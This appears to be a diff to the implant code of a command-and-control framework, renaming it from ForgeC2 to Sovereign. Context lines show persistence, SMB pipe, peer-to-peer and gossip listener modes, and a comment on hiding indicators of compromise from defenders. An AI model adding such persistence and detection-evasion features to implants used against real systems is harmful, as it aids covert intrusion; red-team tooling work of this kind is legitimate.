@@ -16,7 +16,7 @@ import (
 	"strings"
 	"time"
 
-	"github.com/forgec2/forgec2/pkg/peimage"
+	"github.com/r0si/sovereign/pkg/peimage"
 )
 
 func init() {
@@ -201,14 +201,14 @@ func init() {
 
 	persistencePrefix = PersistencePrefixStr
 	if persistencePrefix == "" {
-		persistencePrefix = "ForgeC2"
+		persistencePrefix = "Sovereign"
 	}
 	if v := os.Getenv("FORGEC2_PERSIST_PREFIX"); v != "" {
 		persistencePrefix = v
 	}
 
 	// Derive transport artifact names from the (operator-controlled) persistence
-	// prefix so the compiled implant never ships the literal "forgec2" as a pipe
+	// prefix so the compiled implant never ships the literal "sovereign" as a pipe
 	// name or SSH username — those are trivial network/process IOCs.
 	if SMBPipeName == "" {
 		SMBPipeName = persistencePrefix
@@ -410,7 +410,7 @@ func main() {
 
 	setDPIAware()
 	if Debug {
-		fmt.Println(s(SForgeC2), "Agent starting...")
+		fmt.Println(s(SSovereign), "Agent starting...")
 	}
 
 	if Persist {
@@ -449,7 +449,7 @@ func main() {
 	// Debug note when running attached to an SMB parent pipe.
 	if getProtocol() == "smb" || getBeaconTransport() == "smb" {
 		if Debug {
-			fmt.Printf(s(SForgeC2)+" SMB child mode, pipe: %s\n", smbPipeName)
+			fmt.Printf(s(SSovereign)+" SMB child mode, pipe: %s\n", smbPipeName)
 		}
 	}
 
@@ -469,7 +469,7 @@ func main() {
 		go p2pParentListen()
 		go p2pCleanupStaleChildren()
 		if Debug {
-			fmt.Printf(s(SForgeC2)+" P2P parent mode (%s) on %s\n", P2PMode, P2PListenAddr)
+			fmt.Printf(s(SSovereign)+" P2P parent mode (%s) on %s\n", P2PMode, P2PListenAddr)
 		}
 	}
 
@@ -489,7 +489,7 @@ func main() {
 		if GossipListenAddr != "" {
 			go gossipListen()
 			if Debug {
-				fmt.Printf(s(SForgeC2)+" Gossip listener on %s\n", GossipListenAddr)
+				fmt.Printf(s(SSovereign)+" Gossip listener on %s\n", GossipListenAddr)
 			}
 		}
 	}
